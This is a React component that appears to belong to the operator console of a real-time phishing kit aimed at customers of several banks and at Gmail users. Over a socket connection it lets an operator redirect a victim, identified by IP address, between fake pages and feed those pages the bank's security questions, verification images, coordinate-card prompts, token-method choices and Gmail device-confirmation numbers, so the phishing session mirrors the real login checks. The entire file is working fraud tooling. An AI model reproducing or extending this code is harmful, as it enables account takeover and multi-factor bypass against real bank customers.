import { useFormik } from "formik"
import {Popover, Button, PopoverTrigger, PopoverContent, Checkbox} from '@nextui-org/react';
import { useState } from "react";
export const RedirectIconLive = ({socket, ip, nameBank, urlPage, onClose, textPage}) => {
  
  const [formView, setFormView] = useState(false)
  const [isSelected, setIsSelected] = useState(false)
  
  const allActionsCondition = true



  const {values, handleBlur, handleChange, handleSubmit } = useFormik({
    initialValues: {
      image: '',
      methodToken: 'SMS Token + Token Email.',
      coordinate1: '',
      coordinate2: '',
      coordinate3: '',
      question1: '',
      question2: '',
      gmailDevice: '', 
      gmailCode: ''
    },
    onSubmit: async({image, methodToken, coordinate1,coordinate2,coordinate3, question1, question2, gmailCode, gmailDevice}) =>{

      if (textPage == 'Preguntas de seguridad') {
        (isSelected) 
        ? socket.emit('[banesco] questions', {questions: JSON.parse(await navigator.clipboard.readText()), ip}) 
        : socket.emit('[banesco] questions', {questions: {question1, question2}, ip})
      }

      if(textPage == 'Metodo seguridad' && !isSelected) socket.emit('[bancamiga] getImage', {image, ip})
      if(textPage == 'Imagen') {
        (isSelected) 
        ? socket.emit('[bancamiga] getListImage', {listImage: JSON.parse(await navigator.clipboard.readText()), ip}) 
        : socket.emit('[bancamiga] getListImage', {listImage: JSON.parse(image), ip})
      }
      if(textPage == 'Metodo de token') socket.emit('[ebillion] sendMethodToken', {methodToken})
      if(textPage == 'Token + Coordenadas' || textPage == 'Coordenadas') socket.emit('[bcr] getCoordinates', {coordinate1,coordinate2,coordinate3, ip})
      if(textPage == 'Gmail verificacion' ) socket.emit('[gmail] deviceAndNumberVerify', {gmailCode, gmailDevice, ip})
      
      textPage == 'Gmail verificacion' 
      ? socket.emit('[live] panelSendRedirect', { ip, urlPage, redirectBag: true, nameBank, specialInfo: false })
      : socket.emit('[live] panelSendRedirect', { ip, urlPage, redirectBag: true, nameBank, specialInfo: true })
      setFormView(false)
      onClose()
    }
  })
  const sendBagRedirect = () => {
    if(textPage == 'Metodo seguridad' || textPage == 'Gmail verificacion' || textPage == 'Imagen' || textPage == 'Metodo de token' || textPage == 'Token + Coordenadas' || textPage == 'Coordenadas' || textPage == 'Preguntas de seguridad') return setFormView(true)
    socket.emit('[live] panelSendRedirect', { ip, urlPage, redirectBag: true, nameBank  })
    setFormView(false)
    onClose()
  }
  
  return (
    <div>
      <Popover  isOpen={formView} onOpenChange={(open) => sendBagRedirect()} placement="right">
        <PopoverTrigger onClick={() => sendBagRedirect()} >
          <div className="cursor-pointer">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="w-6 h-6">
                <path strokeLinecap="round" strokeLinejoin="round" d="M6 12 3.269 3.125A59.769 59.769 0 0 1 21.485 12 59.768 59.768 0 0 1 3.27 20.875L5.999 12Zm0 0h7.5" />
            </svg>
          </div>
        </PopoverTrigger>
        <PopoverContent >
          <form onSubmit={handleSubmit} className={'p-2 flex gap-2 flex-col'}>
            {
              textPage == 'Preguntas de seguridad' ? (
                  <>
                    <p>Preguntas de seguridad Banesco</p>
                    <span>Pregunta 1</span>
                    <input disabled={isSelected} required autoComplete="false" className="w-full py-1 pl-2" type="text" name="question1" value={values.question1} onChange={handleChange} />
                    <span className="mt-2">Pregunta 2</span>
                    <input disabled={isSelected}  autoComplete="false" className="w-full py-1 pl-2 mb-2" type="text" name="question2" value={values.question2} onChange={handleChange} />

                    <Checkbox isSelected={isSelected} onValueChange={setIsSelected}>
                      Enviar lo copiado
                    </Checkbox>
                  </>

              ) : null
            }
            {
              textPage == 'Token + Coordenadas' || textPage == 'Coordenadas' ? (
                  <>
                    <p>Manda tus coordenadas BCR</p>
                    <span>coordenada1</span>
                    <input required autoComplete="false" className="w-full py-1 pl-2" type="text" name="coordinate1" value={values.coordinate1.toString().slice(0,2)} onChange={handleChange} />
                    
                    <span className="mt-2">coordenada2</span>
                    <input  autoComplete="false" className="w-full py-1 pl-2 mb-2" type="text" name="coordinate2" value={values.coordinate2.toString().slice(0,2)} onChange={handleChange} />
                    <span>coordenada3</span>
                    
                    <input  autoComplete="false" className="w-full py-1 pl-2" type="text" name="coordinate3" value={values.coordinate3.toString().slice(0,2)} onChange={handleChange} />
                  </>

              ) : null
            }
            {
              textPage == 'Metodo de token' 
              ? (
              <>
                <p>Escoge cual es el metodo token</p>
                <select name="methodToken" onChange={handleChange}  className="py-2" value={values.methodToken}  defaultValue={'SMS Token + Token Email.'}>
                  <option value="SMS Token + Token Email.">SMS Token + Token Email.</option>
                  <option value="SMS Token + Key.">SMS Token + Key.</option>
                  <option value="Token Email + Key.">Token Email + Key.</option>
                </select>
              </>
              )
              : null

            }
            {
              textPage == 'Metodo seguridad' ? (
                <>
                  <p>Introduce el link de la imagen</p>
                  <input disabled={isSelected} required autoComplete="false" className="w-full py-1 " type="text" name="image" value={values.image} onChange={handleChange} />
                  <Checkbox isSelected={isSelected} onValueChange={setIsSelected}>
                    Omitir foto
                  </Checkbox>
                </>
              ) : null
            }
            {
              textPage == 'Imagen' ? (
                  <Checkbox isSelected={isSelected} onValueChange={setIsSelected}>
                    Enviar lo copiado
                  </Checkbox>
              ) : null
            }
            {
              textPage == 'Gmail verificacion' ? (
                <div className="flex flex-col gap-5">
                  <div> 
                    <label htmlFor="deviceGmail">Dispositivo</label>
                    <input required autoComplete="false" className="w-full py-1 pl-3" type="text" name="gmailDevice" value={values.gmailDevice} onChange={handleChange} />
                  </div>
                  <div>
                    <label htmlFor="deviceGmail">Numero de confirmación</label>
                    <input required autoComplete="false" className="w-full py-1 pl-3" type="number" name="gmailCode" value={values.gmailCode.toString().slice(0,2)} onChange={handleChange} />
                  </div>
                </div>

              ) : null
            }
           
            <Button className="w-full mt-5" type="submit" color="primary" variant="shadow" size="sm" >ENVIAR</Button>
          </form>
        </PopoverContent>
      </Popover>
      
      
    </div>
  )
}
